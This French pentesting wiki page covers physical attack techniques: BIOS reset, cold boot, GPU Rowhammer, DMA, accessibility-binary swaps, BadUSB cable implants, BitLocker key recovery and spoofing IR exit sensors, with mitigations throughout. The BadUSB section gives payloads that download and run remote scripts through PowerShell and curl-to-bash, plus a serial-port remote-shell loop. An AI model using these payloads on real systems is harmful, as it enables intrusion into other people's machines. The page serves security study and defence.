# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe du BIOS et sécurité du système

Les paramètres du firmware des PC anciens peuvent être réinitialisés en déconnectant la pile CMOS ou en utilisant un cavalier clear-CMOS documenté. Le temps nécessaire hors tension dépend de la carte mère, et les mots de passe ou clés UEFI modernes peuvent être stockés dans une mémoire flash non volatile, un contrôleur embarqué ou un dispositif de sécurité, et ainsi survivre au retrait de la pile. Consultez le manuel de la carte mère ou de maintenance avant de court-circuiter des broches ; cette procédure peut également invalider les mesures TPM et déclencher la récupération du chiffrement du disque.

Sur les systèmes x86 anciens, des outils tels que **killCMOS** et **CmosPwd** peuvent inspecter ou modifier les paramètres stockés dans le CMOS depuis un environnement amorçable. CmosPwd reconnaît les formats de mots de passe d'un ensemble documenté d'anciennes familles de BIOS et peut sauvegarder, restaurer ou effacer/tuer l'état du CMOS ; ses builds publiés ciblent les environnements DOS/Windows anciens, Linux, FreeBSD et NetBSD.<sup>[[18]](#references)</sup> Ces utilitaires ne sont pas des outils génériques de suppression des mots de passe UEFI et nécessitent un accès matériel/firmware suffisant.

Certains firmwares de laptop affichent un code de challenge spécifique au fournisseur après plusieurs tentatives de mot de passe infructueuses. Des bases de données telles que [bios-pw.org](https://bios-pw.org) peuvent dériver des mots de passe de récupération legacy propres à certains fournisseurs pour certains modèles, mais de nombreux systèmes implémentent un lockout sans challenge dérivable. Considérez tout mot de passe généré comme spécifique au modèle et évitez d'épuiser les compteurs de tentatives permanents.

### Sécurité UEFI

Pour les systèmes **UEFI** modernes, CHIPSEC peut auditer les protections des variables Secure Boot. Commencez par la vérification non modificatrice ci-dessous ; le mode optionnel `-a modify` tente délibérément de corrompre les variables et doit être utilisé uniquement sur un système de laboratoire récupérable. CHIPSEC avertit lui-même que son driver privilégié et son accès matériel bas niveau ne conviennent pas aux endpoints de production.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analyse de la RAM et attaques Cold Boot

La DRAM ne perd pas chaque bit immédiatement lorsque le rafraîchissement s'arrête. Le taux de dégradation varie considérablement selon la technologie du module et la température ; le refroidissement peut préserver des données utiles bien plus longtemps qu'un cycle d'alimentation sans refroidissement. Une attaque Cold Boot redémarre rapidement vers un petit environnement d'acquisition ou transfère un module refroidi, capture la mémoire brute et reconstruit les clés cryptographiques malgré la dégradation des bits. Un utilitaire de copie de disque n'est pas automatiquement un imageur de mémoire physique, et Volatility analyse une capture au lieu de l'acquérir ; utilisez un outil d'acquisition adapté à la plateforme et validé.<sup>[[12]](#references)</sup>

---

## Rowhammer GPU contre les tables de pages

Les attaques GPU Rowhammer modernes deviennent beaucoup plus utiles lorsqu'elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que des buffers ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere GDDR6** montrent qu'un attaquant exécutant du code CUDA non privilégié peut créer des motifs de hammering spécifiques au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des lignes vulnérables, puis inverser des bits dans la **table de pages de dernier niveau** ou dans un **répertoire de pages** intermédiaire. Une fois une seule entrée de traduction corrompue, l'attaquant peut établir une primitive de **lecture/écriture arbitraire de la mémoire GPU**, puis pivoter vers la compromission de l'hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Schéma d'exploitation

1. **Profiler les lignes pouvant être hammerées** dans la GDDR6 et créer des motifs de hammering tenant compte du rafraîchissement / non uniformes qui contournent les mitigations intégrées à la DRAM.
2. **Effectuer du memory massaging sur les allocations GPU** afin que le pilote place les structures de traduction des pages dans des emplacements physiques pouvant être hammerés, au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut impliquer d'épuiser la région de mémoire basse réservée aux tables de pages et de pulvériser de grands mappings UVM clairsemés avec des strides contrôlés.
3. **Inverser les métadonnées de traduction**, comme les bits **PFN** ou liés à l'aperture à l'intérieur d'une entrée de table de pages / répertoire de pages, afin que la page virtuelle contrôlée par l'attaquant soit résolue vers des pages de tables de pages, de la mémoire GPU arbitraire ou des mappings système visibles par l'hôte.
4. Réutiliser le mapping forgé pour réécrire d'autres entrées de traduction et obtenir une **lecture/écriture arbitraire de la mémoire GPU** entre les contextes GPU.

### Pivot vers l'hôte et mitigations

- Avec l'**IOMMU désactivé**, les mappings forgés de l'aperture système peuvent exposer une **mémoire physique arbitraire de l'hôte** au GPU, transformant la primitive GPU en compromission complète de l'hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées de la table de pages de dernier niveau, tandis que **GeForge** montre que la corruption d'un niveau de répertoire de pages peut être plus facile, car une seule inversion de bit peut rediriger un sous-arbre de traduction plus vaste. Ne considérez pas une seule couche de pagination comme étant la seule critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- L'**IOMMU** reste importante, car elle bloque le chemin direct vers la mémoire arbitraire de l'hôte utilisé par GDDRHammer/GeForge, mais elle ne constitue **pas une mitigation complète**. **GPUBreach** montre un pivot en seconde étape où l'attaquant corrompt des buffers CPU inscriptibles par le GPU et appartenant au pilote, puis déclenche des bugs de memory safety du pilote NVIDIA afin d'obtenir une primitive d'écriture noyau et un **root shell**, même lorsque l'IOMMU est activée.<sup>[[3]](#references)</sup>
- L'**ECC au niveau système** constitue une mesure de durcissement pratique sur les GPU workstation/server compatibles. Les GPU grand public sans ECC exposent une surface de défense plus faible.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** inversions de bits sur une RTX 3060 et **202** sur une RTX A6000, ce qui a suffi à construire une chaîne fonctionnelle d'élévation de privilèges sur l'hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques Direct Memory Access (DMA)

**Inception** démontre l'**acquisition et la modification de mémoire par DMA** via des interfaces telles que FireWire et les premières configurations Thunderbolt, notamment des signatures historiques de contournement de connexion. Il n'est pas simplement « inefficace contre Windows 10 » : l'exploitabilité dépend de l'interface, de la build cible, de la politique IOMMU, de l'état de verrouillage et de la prise en charge et de l'activation de Windows Kernel DMA Protection. Windows 10 version 1803 et les versions ultérieures ont introduit Kernel DMA Protection sur les plateformes compatibles, modifiant considérablement la surface d'attaque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB pour accéder au système

Sur un volume Windows non chiffré ou déjà déverrouillé, un environnement hors ligne peut remplacer des binaires d'accessibilité tels que **sethc.exe** ou **Utilman.exe** par **cmd.exe**, ce qui fournit une invite de commande SYSTEM lorsque le raccourci correspondant de l'écran de connexion est exécuté. Des outils tels que **chntpw** peuvent modifier les données des comptes locaux SAM. Ces méthodes ne contournent pas un volume BitLocker verrouillé et peuvent endommager les identifiants protégés par DPAPI/EFS ; conservez des copies forensiques et des sauvegardes.

**Kon-Boot** est un outil commercial de contournement de l'authentification au démarrage pour certaines configurations Windows/macOS prises en charge. La compatibilité dépend du système d'exploitation, du mode firmware, de Secure Boot et de la configuration du chiffrement du disque ; il ne déchiffre pas un volume verrouillé par BitLocker.<sup>[[10]](#references)</sup>

---

## Gestion des fonctionnalités de sécurité Windows

### Raccourcis de démarrage et de récupération

- **Delete/Supr**, F2, F10 ou une autre touche du fabricant peut ouvrir la configuration du firmware.
- **F8** ouvre les options avancées de démarrage Windows héritées uniquement sur les configurations où cette fonction reste activée ; l'accès actuel à la récupération varie.
- Maintenir **Shift** peut empêcher la connexion automatique de Windows dans certaines configurations, bien que les paramètres de stratégie/registre puissent désactiver ce comportement.<sup>[[17]](#references)</sup>

### Périphériques BAD USB

Des périphériques tels que **USB Rubber Ducky** et les cartes Teensy peuvent s'énumérer comme des claviers HID approuvés et injecter des frappes prédéfinies. Le payload dispose initialement des privilèges et de l'accès au bureau de la session ouverte ; les invites UAC, le verrouillage de l'écran, la disposition du clavier, le timing et la politique USB du endpoint le contraignent toujours.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Les privilèges d'administrateur ou de backup peuvent créer une shadow copy ou enregistrer les ruches du registre afin que des fichiers verrouillés tels que **SAM** et **SYSTEM** puissent être acquis. Il s'agit d'une technique de collecte post-compromission, et non d'un contournement de privilèges ; elle doit être corrélée aux événements `diskshadow`/VSS et d'exportation des ruches du registre.

## Techniques d'implant BadUSB / HID

### Implants de câbles Wi-Fi managed

- Les implants basés sur ESP32-S3 tels que **Evil Crow Cable Wind** se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, s'énumèrent uniquement comme un clavier USB et exposent leur stack C2 via Wi-Fi. L'opérateur doit seulement alimenter le câble depuis l'hôte victime, créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l'interface HTTP intégrée.<sup>[[8]](#references)</sup>
- L'interface du navigateur fournit des onglets pour *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les payloads stockés sont marqués par système d'exploitation, les dispositions de clavier sont changées à la volée et les chaînes VID/PID peuvent être modifiées pour imiter des périphériques connus.
- Comme le C2 se trouve à l'intérieur du câble, un téléphone peut préparer les payloads, déclencher leur exécution et gérer les identifiants Wi-Fi sans utiliser le réseau de l'organisation — ce qui est utile pour les intrusions physiques de courte durée.

### Payloads AutoExec adaptés au système d'exploitation

- Les règles AutoExec associent un ou plusieurs payloads afin qu'ils soient exécutés immédiatement après l'énumération USB. L'implant effectue une identification légère du système d'exploitation et sélectionne le script correspondant.
- Exemple de workflow :
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l'exécution est automatisée, le simple remplacement d'un câble de recharge peut permettre un accès initial « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### Remote shell amorcé par HID via Wi-Fi TCP

1. **Amorçage par frappes clavier :** Un payload stocké ouvre une console et colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante Windows minimale est la suivante :
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge :** L’implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable desktop) vers l’opérateur. Tous les octets saisis dans la session TCP sont transférés vers la connexion série ci-dessus, permettant ainsi l’exécution de commandes à distance, même sur des hosts air-gapped. La sortie étant limitée, les opérateurs exécutent généralement des commandes à l’aveugle (création de comptes, staging d’outils supplémentaires, etc.).

### Surface de mise à jour HTTP OTA

- L’interface documentée d’Evil Crow Cable Wind expose un endpoint de mise à jour du firmware non authentifié à l’adresse `/update` :<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Les opérateurs sur le terrain peuvent remplacer à chaud des fonctionnalités (par exemple, le firmware de flash USB Army Knife) au cours d’une opération sans ouvrir le câble, ce qui permet à l’implant de passer à de nouvelles capacités tout en restant connecté à l’hôte cible.

## Contourner le chiffrement BitLocker

Une acquisition forensic autorisée d’un système actif ou récemment utilisé peut contenir une clé maître de volume BitLocker ou du matériel de clé associé lorsque le volume est déverrouillé. Des outils commerciaux tels qu’Elcomsoft Forensic Disk Decryptor et Passware Kit Forensic peuvent rechercher ces éléments dans des images mémoire, des fichiers d’hibernation ou des crash dumps pris en charge, mais leur récupération n’est pas garantie. Les versions modernes de Windows chiffrent également les crash dumps lorsque BitLocker est activé, et un mot de passe de récupération de 48 chiffres stocké est un artefact différent d’une clé de volume présente en mémoire.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering pour l’ajout d’une clé de récupération

Un attaquant qui persuade un administrateur d’exécuter des commandes de gestion BitLocker peut ajouter un recovery-password, une external-key ou un autre protecteur, puis le récupérer. Un mot de passe de récupération ne peut pas être une chaîne arbitraire composée de zéros : les mots de passe de récupération numériques BitLocker ont un format validé de 48 chiffres. La syntaxe d’administration autorisée correspondante est `manage-bde -protectors -add C: -recoverypassword`; listez les protecteurs obtenus avec `manage-bde -protectors -get C:`. Surveillez l’ajout de protecteurs et assurez-vous que tout nouveau matériel de récupération est escrowed uniquement vers des emplacements approuvés.<sup>[[16]](#references)</sup>

---

## Exploiter les commutateurs d’intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d’usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau compacts intègrent un **châssis-intrusion switch** surveillé par l’Embedded Controller (EC) et le firmware BIOS/UEFI. Bien que l’objectif principal de ce commutateur soit de déclencher une alerte lorsqu’un appareil est ouvert, certains fabricants implémentent parfois un **raccourci de récupération non documenté**, déclenché lorsque le commutateur est actionné selon une séquence spécifique.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l’attaque

1. Le commutateur est relié à une **GPIO interrupt** sur l’EC.
2. Le firmware exécuté sur l’EC mémorise le **moment et le nombre d’ pressions**.
3. Lorsqu’une séquence codée en dur est reconnue, l’EC appelle une routine de *mainboard-reset* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, les modèles concernés chargent l’état du firmware réinitialisé. Selon le fabricant et la révision, l’état effacé peut inclure un mot de passe superviseur, des paramètres de démarrage personnalisés ou des clés Secure Boot enrôlées ; l’état du TPM et les effets sur le chiffrement du disque doivent être évalués séparément.

> Une réinitialisation du firmware peut restaurer les options de démarrage externe, mais elle ne **déchiffre** pas le stockage. BitLocker ou un autre système de chiffrement intégral du disque peut passer en mode de récupération après des changements du TPM/firmware et continuer à protéger le disque interne sans clé de récupération.<sup>[[16]](#references)</sup>

### Exemple concret – ordinateur portable Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est :
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Après le dixième cycle, l’EC active un indicateur qui demande au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend ~40 s et ne nécessite **rien d’autre qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure d’exploitation générique

1. Mettez la cible sous tension ou effectuez une suspension-reprise afin que l’EC soit en fonctionnement.
2. Retirez le capot inférieur pour exposer le commutateur d’intrusion/maintenance.
3. Reproduisez le schéma de basculement propre au fabricant (consultez la documentation et les forums, ou reverse-engineer le firmware de l’EC).
4. Remontez l’appareil et redémarrez-le, puis vérifiez quels paramètres du firmware et identifiants ont réellement changé.
5. Si vous y êtes autorisé et que le démarrage externe est disponible, démarrez une image live contrôlée. Dès qu’un volume interne est légitimement déverrouillé (ou s’il n’a jamais été chiffré), l’environnement live peut acquérir des identifiants et des données, ou inspecter l’EFI System Partition. La modification de cette partition pour installer un implant EFI est persistante et très intrusive, et reste limitée par Secure Boot, le measured boot, la protection en écriture du firmware et la surveillance des endpoints. Le stockage chiffré reste inaccessible sans sa clé ou ses éléments de récupération.

### Détection et mitigation

* Consignez les événements d’intrusion du châssis dans la console de gestion de l’OS et corrélez-les avec les réinitialisations inattendues du BIOS.
* Utilisez des **scellés inviolables** sur les vis et les capots afin de détecter toute ouverture.
* Conservez les appareils dans des **zones physiquement contrôlées** ; partez du principe que l’accès physique équivaut à une compromission complète.
* Lorsque cette option existe, désactivez la fonctionnalité « maintenance switch reset » du fabricant ou exigez une autorisation cryptographique supplémentaire pour les réinitialisations de la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie No-Touch

### Caractéristiques du capteur
- Les capteurs « wave-to-exit » courants associent un émetteur LED proche infrarouge à un module récepteur de type télécommande qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (~4–10) de la porteuse correcte (≈30 kHz).<sup>[[7]](#references)</sup>
- Un cache en plastique empêche l’émetteur et le récepteur de se regarder directement ; le contrôleur suppose donc que toute porteuse validée provient d’une réflexion proche et actionne un relais qui ouvre la gâche électrique.
- Une fois que le contrôleur considère qu’une cible est présente, il modifie souvent l’enveloppe de modulation sortante, mais le récepteur continue d’accepter toute salve correspondant à la porteuse filtrée.

### Workflow d’attaque
1. **Capturez le profil d’émission** – branchez un analyseur logique sur les broches du contrôleur afin d’enregistrer les formes d’onde avant et après détection qui pilotent la LED IR interne.
2. **Rejouez uniquement la forme d’onde « post-détection »** – retirez ou ignorez l’émetteur d’origine et pilotez une LED IR externe avec le pattern déjà déclenché dès le départ. Comme le récepteur ne s’intéresse qu’au nombre et à la fréquence des impulsions, il traite la porteuse spoofée comme une réflexion authentique et active la ligne du relais.
3. **Cadencez la transmission** – transmettez la porteuse sous forme de salves réglées (par exemple, allumées pendant quelques dizaines de millisecondes, puis éteintes pendant une durée similaire) afin de fournir le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni sa logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’activer.

### Injection réfléchie à longue portée
- Le remplacement de la LED de banc par une diode IR haute puissance, un driver MOSFET et une optique de focalisation permet un déclenchement fiable à ~6 m.
- L’attaquant n’a pas besoin d’une ligne de visée vers l’ouverture du récepteur ; il peut viser des murs intérieurs, des étagères ou des encadrements de porte visibles à travers une vitre, afin que l’énergie réfléchie pénètre dans le champ de vision d’environ ~30° et imite un geste de la main à courte portée.
- Comme les récepteurs ne s’attendent qu’à de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Torche d’attaque weaponisée
- L’intégration du driver dans une lampe torche commerciale dissimule l’outil à la vue de tous. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou équivalent) pour générer les salves d’environ ≈30 kHz, et utilisez un MOSFET pour absorber le courant de la LED.
- Une lentille zoom télescopique resserre le faisceau pour augmenter la portée et la précision, tandis qu’un moteur vibrant commandé par le MCU fournit une confirmation haptique de l’activation de la modulation sans émettre de lumière visible.
- Le parcours de plusieurs patterns de modulation enregistrés (fréquences de porteuse et enveloppes légèrement différentes) augmente la compatibilité avec les différentes familles de capteurs rebrandés, permettant à l’opérateur de balayer les surfaces réfléchissantes jusqu’à entendre le clic du relais et l’ouverture de la porte.

---

## References

- [1] [GDDRHammer: Perturbation importante des lignes DRAM — attaques Rowhammer inter-composants contre les GPU modernes](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Perturber la mémoire GDDR pour forger des tables de pages GPU, pour le plaisir et le profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Attaques d’élévation de privilèges contre les GPU utilisant Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avis de sécurité : Rowhammer - juillet 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – « Framework 13. Appuyez ici pour pwn »](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guide de réinitialisation de la carte mère](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – « Noooooooo Touch! – Contourner les capteurs de sortie IR No-Touch avec une torche IR furtive »](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – « Plug, Play, Pwn: Hacking with Evil Crow Cable Wind »](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attaque Rowhammer contre les puces NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation officielle de Kon-Boot et informations de compatibilité](https://kon-boot.com/)
- [11] [Documentation de CHIPSEC - Protections des variables Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Attaques cold boot contre les clés de chiffrement](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Manipulation de la mémoire physique via DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentation de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guide des opérations BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Maintien de la touche Shift et comportement de l’ouverture de session automatique](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentation et téléchargements de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
